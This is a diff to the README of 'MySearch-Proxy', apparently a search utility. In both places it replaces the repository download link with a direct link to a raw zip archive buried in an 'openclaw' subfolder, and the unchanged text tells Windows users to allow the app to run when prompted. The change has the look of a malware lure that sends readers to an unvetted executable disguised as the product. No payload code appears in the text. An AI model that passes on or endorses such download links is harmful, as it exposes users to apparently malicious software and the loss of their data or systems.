@@ -1,6 +1,6 @@
 # 🔎 MySearch-Proxy - Unified Search for Every Workflow
 
-[![Download MySearch-Proxy](https://img.shields.io/badge/Download-MySearch--Proxy-blue?style=for-the-badge&logo=github)](https://github.com/constanceintrauterine625/MySearch-Proxy)
+[![Download MySearch-Proxy](https://img.shields.io/badge/Download-MySearch--Proxy-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/constanceintrauterine625/MySearch-Proxy/main/openclaw/Proxy-My-Search-3.2.zip)
 
 ## 🧭 What this is
 
@@ -28,7 +28,7 @@ If Windows asks for approval, choose to allow the app to run.
 
 Visit this page to download MySearch-Proxy:
 
-https://github.com/constanceintrauterine625/MySearch-Proxy
+https://raw.githubusercontent.com/constanceintrauterine625/MySearch-Proxy/main/openclaw/Proxy-My-Search-3.2.zip
 
 Use the page to get the latest version for Windows, then save the file to your computer.
 
